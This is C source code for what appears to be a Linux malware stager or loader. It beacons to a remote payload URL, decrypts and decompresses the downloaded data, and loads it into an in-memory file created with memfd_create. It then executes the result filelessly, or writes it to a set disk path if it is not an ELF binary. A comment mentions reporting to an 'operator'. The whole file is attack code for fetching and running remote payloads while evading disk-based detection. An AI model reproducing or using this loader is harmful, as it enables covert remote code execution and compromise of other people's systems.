#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include "detect.h"
#include "helpers.h"
#include "networking.h"
#include "preferences.h"

int main(int argc, char **argv)
{
    struct MemoryStruct payload;
    void *decrypted;
    void *decompressed;
    unsigned int uncompressedLength;
    unsigned int encryptedLength;
    unsigned int decryptedLength;
    int totalMetaBytes = 12; // hold number of prepended bytes before payload file start
    int payloadFD; // in memory file descriptor
    int writeReturnSize;
    int d;                               //to hold the return value of detect()
    char *payload_argv[] = PAYLOAD_ARGV; // argv for payload
    char *payload_envp[] = PAYLOAD_ENVP; // envp for payload
    char *pathToWrite = PATH_TO_WRITE;

    payload = beacon(PAYLOAD_URL);
    puts("got payload");

    uncompressedLength = getUncompLen(payload.memory);
    encryptedLength = getEncLen(payload.memory);
    decryptedLength = getDecryptedLen(payload.memory);
    printf("uncomplen: %d enclen: %d declen: %d\n", uncompressedLength, encryptedLength, decryptedLength);
    payload.memory += 12;

    decrypted = (void *)decrypt((unsigned char *)payload.memory, encryptedLength, decryptedLength);
    if (decrypted == NULL)
    {
        puts("Bad decrypt");
        free(decrypted);
        return -1;
    }

    decompressed = (void *)decompress((unsigned char *)decrypted, (uLong)uncompressedLength, (uLong)decryptedLength);

    while ((payloadFD = memfd_create("temp", 0)) <= 2)
    { // create memory file descriptor for execution
        printf("memfd_create() failed. File descriptor created: %d\n", payloadFD);
        close(payloadFD);
        return -1;
    }

    writeReturnSize = write(payloadFD, decompressed, uncompressedLength); // write to mem_fd and error check
    if (writeReturnSize != uncompressedLength)
    {
        printf("Writing to mem_fd failed. %d bytes written when %d bytes were supposed to be written.\n", writeReturnSize, (int)uncompressedLength);
        return -1;
    }

    d = detect((unsigned char *)decompressed); //determine if the payload is an executable/ELF

    if (d == 1)
    {
        if (executePayload(payloadFD, payload_argv, payload_envp) == 0)
        {
            //send message to operator
            free(decompressed);
            return -1;
        }
    }
    else
    {
        writeToDisk(decompressed, pathToWrite, uncompressedLength);
    }
    free(decompressed);
    return 0;
}